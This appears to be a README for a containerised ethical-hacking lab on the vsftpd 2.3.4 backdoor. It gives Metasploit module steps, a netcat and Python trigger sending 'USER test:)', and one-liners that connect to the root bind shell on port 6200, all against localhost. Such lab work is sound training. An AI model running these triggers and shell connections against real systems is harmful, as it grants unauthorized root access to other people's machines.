# Metasploit Framework & Service Exploitation Lab

## Overview

Exploit vulnerable classic network daemons (FTP vsftpd 2.3.4 backdoor, SSH brute force, Telnet misconfigurations, HTTP applications).

- **Default Ports & Services**:
  - **FTP**: `2121` (vsftpd 2.3.4)
  - **SSH**: `2222` (OpenSSH 4.7p1)
  - **Telnet**: `2323` (Linux telnetd)
  - **HTTP**: `8082` (Apache 2.2.8 - Mutillidae, DVWA, phpMyAdmin, TWiki)
  - **Backdoor Shell**: `6200` (vsftpd 2.3.4 spawned root backdoor shell)
- **Directory**: `Classes/01_cyber_security_ethical_hacking/metasploit_and_system_hacking`
- **Container Name**: `cyberlab_01_metasploit_target`

---

## Port 6200 Architecture & Fix Rationale

The vsftpd 2.3.4 vulnerability contains a malicious backdoor inserted into the source code archive in July 2011. When a username ending with a smiley face `:)` is supplied, the daemon spawns a bind shell on TCP port `6200` with root privileges.

In containerized lab environments, mapping only the control port `2121:21` is insufficient:

- Metasploit's `exploit/unix/ftp/vsftpd_234_backdoor` connects to FTP on port `2121` and sends `USER <name>:)` followed by `PASS <pass>`.
- The vsftpd process forks and opens a listening shell on TCP port `6200` inside the container.
- Metasploit then attempts to connect back to the host target on port `6200`.
- **Critical Fix**: Port `"6200:6200"` is explicitly exposed and mapped in `docker-compose.yml`. Without this mapping, Metasploit triggers the backdoor successfully inside the container but fails to establish the shell session from the host.

---

## How to Solve & Practice

### Method 1: Automated Exploitation with Metasploit

1. Start the lab:
   ```bash
   docker compose up -d
   # or from repo root:
   ./lab start meta-target
   ```
2. Launch the Metasploit console:
   ```bash
   msfconsole -q
   ```
3. Load the vsftpd backdoor exploit module:
   ```msf
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```
4. Configure target host and mapped FTP port:
   ```msf
   set RHOSTS 127.0.0.1
   set RPORT 2121
   ```
5. Run the exploit:
   ```msf
   run
   ```
6. Verify root access when the session opens:
   ```msf
   id
   # Output: uid=0(root) gid=0(root)
   ```

---

### Method 2: Manual Trigger Proof via Netcat / Python

You can verify the vulnerability without Metasploit by directly sending the trigger sequence `USER test:)` and `PASS test`:

#### 1. Trigger the backdoor (Netcat):

```bash
(echo "USER test:)"; sleep 1; echo "PASS test"; sleep 1) | nc -vn 127.0.0.1 2121
```

Or trigger using Python 3:

```bash
python3 -c "import socket; s = socket.socket(); s.connect(('127.0.0.1', 2121)); print(s.recv(1024).decode()); s.sendall(b'USER test:)\r\n'); print(s.recv(1024).decode()); s.sendall(b'PASS test\r\n'); s.close()"
```

#### 2. Connect to the spawned root shell on Port 6200:

```bash
nc -vn 127.0.0.1 6200
```

Then execute commands:

```bash
id
uname -a
```

Or execute via a single Python one-liner:

```bash
python3 -c "import socket; s = socket.socket(); s.connect(('127.0.0.1', 6200)); s.sendall(b'id; uname -a\n'); print(s.recv(1024).decode()); s.close()"
```

---

## YouTube Walkthroughs & Solving Guides

- [Exploiting VSFTPD v2.3.4 Using Metasploit](https://www.youtube.com/watch?v=JYoySps-844)
- [NetworkChuck - Metasploit Framework basics on Kali Linux](https://www.youtube.com/watch?v=aRwxsn9ZEQw)
- [David Bombal - Metasploit Hacking Demo & Exploitation](https://www.youtube.com/watch?v=bBut8D7usKA)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Start this lab
./lab start meta-target

# Stop this lab
docker compose down
# or
./lab stop meta-target
```
